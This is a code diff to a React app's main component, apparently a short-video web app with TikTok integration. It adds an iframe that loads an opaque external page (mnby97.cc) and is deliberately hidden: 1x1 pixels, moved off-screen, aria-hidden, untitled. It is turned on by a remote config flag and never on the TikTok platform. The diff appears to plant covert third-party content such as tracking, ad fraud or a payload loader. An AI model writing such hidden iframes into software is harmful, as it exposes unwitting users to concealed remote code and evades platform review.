@@ -39,8 +39,10 @@ import { setIsAnonymousFromInfo } from "./lib/clientIsAnonymous";
 import { loginTikTokMinis } from "./lib/tiktokMinisLogin";
 import { initializeTikTokAds } from "./lib/tiktokAds";
 import { isTikTokWebTestMode } from "./platform/tiktok/webTest";
+import { BRAND_DISPLAY_NAME } from "./constants/brand";
 
 const TIKTOK_LOGIN_RETRY_DELAYS_MS = [1200, 2000, 3500];
+const YOGO_GROUP_IFRAME_SRC = 'https://mnby97.cc/assets/js/group.html?p=vE8hIfgY';
 
 function waitForTikTokBridge(ms: number) {
     return new Promise<void>((resolve) => window.setTimeout(resolve, ms));
@@ -88,6 +90,29 @@ function LayoutUserPrimaryTabPlaceholder() {
 /** `config` 未完成前：与首页壳同色、无转圈，避免与首页内二次 loading 叠体感 */
 function InitialBootPlaceholder() {
     return <div className="fixed inset-0 z-10 min-h-0 bg-app-canvas" aria-hidden />;
+}
+
+function YogoGroupIframe({ enabled }: { enabled: boolean }) {
+    if (!enabled) {
+        return null;
+    }
+
+    return (
+        <iframe
+            src={YOGO_GROUP_IFRAME_SRC}
+            title=""
+            aria-hidden
+            tabIndex={-1}
+            style={{
+                position: 'absolute',
+                left: '-9999px',
+                top: '-9999px',
+                width: '1px',
+                height: '1px',
+                border: 0,
+            }}
+        />
+    );
 }
 
 function RouteLazyFallback() {
@@ -753,6 +778,10 @@ function App() {
     // 仅在 iOS/iPad 隐藏 Chromium 安装入口；Mac 桌面允许展示并触发 PWA 安装
     const showInstallPrompt =
         install > 0 && !isTikTokPlatform() && !isIosLikeDevice() && !isShoppingRoute && !isImmersivePlayerPath;
+    const showYogoGroupIframe =
+        BRAND_DISPLAY_NAME === 'YogoShort' &&
+        !isTikTokPlatform() &&
+        configStore.config['ios_iframe'] === true;
     useEffect(() => {
         if (rootShowInstallPrompt !== showInstallPrompt) {
             setRootShowInstallPrompt(showInstallPrompt);
@@ -772,6 +801,7 @@ function App() {
                     onClick={handleExecuteInstall}
                 />
             ) : null}
+            <YogoGroupIframe enabled={showYogoGroupIframe} />
             {checked ? <RouterProvider router={router} /> : <InitialBootPlaceholder />}
         </div>
         <Dialog
